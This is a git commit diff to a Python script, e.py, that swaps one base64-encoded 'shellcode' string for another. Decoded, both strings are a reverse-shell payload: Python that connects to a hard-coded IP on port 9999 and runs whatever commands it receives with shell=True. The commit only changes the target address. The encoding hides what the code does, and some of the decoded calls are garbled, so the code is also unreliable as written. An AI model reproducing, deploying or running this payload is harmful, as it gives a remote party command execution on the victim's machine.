0041c45d7413f46086a6c0ce4ca02fa170ec0d45
jackson123456789w <mironetczah@gmail.com>
2025-04-22 12:05:45 +0200

    Update e.py

--- e.py
+++ e.py
@@ -8,9 +8,8 @@ def run_shellcode():
         print(f"[!] Shellcode execution failed: {e}")
 
 encoded_shellcode = (
-    "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCkNMSUVOVF9JUD0iMTAuMC4wLjEiCkNMSUVOVF9QT1JUPTk5OTkK"
-    "cyA9IHNvY2tldC5zb2NrZXQoKQpzLmNvbm5lY3QoKENMSUVOVF9JUCwgQ0xJRU5UX1BPUlQpKQpzLmR1cChzLmZp"
-    "bGVubygpLCAwKQpvcy5kdXAyKGZpbGVubj0wLGRzY3JmPTApCm9zLmR1cDIoZmlsZW5uPTAsZHN0aW49MCkKb3Mu"
-    "ZHVwMChmaWxlbm49MCxkc291dD0wKQpzdWJwcm9jZXNzLmNhbGwocy5yZWN2KDEwMjQpLnN0cmlwKCksIHNoZWxs"
-    "PVRydWUp"
+    "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCkNMSUVOVF9JUD0iMTAuMC4xLjMzIgpDTElFTlRfUE9SVD05OTk5"
+    "CnMgPSBzb2NrZXQuc29ja2V0KCkKcy5jb25uZWN0KChDTElFTlRfSVAsIENMSUVOVF9QT1JUKSkKcy5kdXAo"
+    "cy5maWxlbm8oKSwgMCkKb3MuZHVwMihmaWxlbm49MCwgZHN0aW49MCkKb3MuZHVwMChmaWxlbm49MCwgZHNv"
+    "dXQ9MCkKc3VicHJvY2Vzcy5jYWxsKHMucmVjdigxMDI0KS5zdHJpcCgpLCBzaGVsbD1UcnVlKQ=="
 )
